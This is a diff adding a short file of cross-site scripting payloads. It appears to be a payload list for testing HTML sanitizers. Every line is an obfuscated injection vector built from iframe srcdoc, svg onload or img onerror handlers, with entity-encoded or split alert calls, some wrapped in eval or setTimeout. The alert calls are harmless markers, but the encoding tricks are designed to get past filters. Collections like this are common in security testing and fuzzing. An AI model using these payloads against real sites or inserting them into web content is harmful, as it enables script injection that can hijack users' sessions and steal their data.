@@ -1,0 +1,10 @@
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#50;&#51;&#41;>">
+<iframe srcdoc="<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;>">
+<svg onload="setTimeout('al'+'ert(123)',0)">
+<iframe srcdoc="<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#x32;&#x33;&#41;>">
+<svg onload="setTimeout(function(){al&#101;rt(123)},0)">
+<iframe srcdoc="<img src=x onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>">
+<iframe srcdoc="<svg onload=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>">
+<iframe srcdoc="<img src=x onerror=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>">
+<svg onload="setTimeout('al'+'ert(123)',0)">
+<iframe srcdoc="<svg onload=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>">
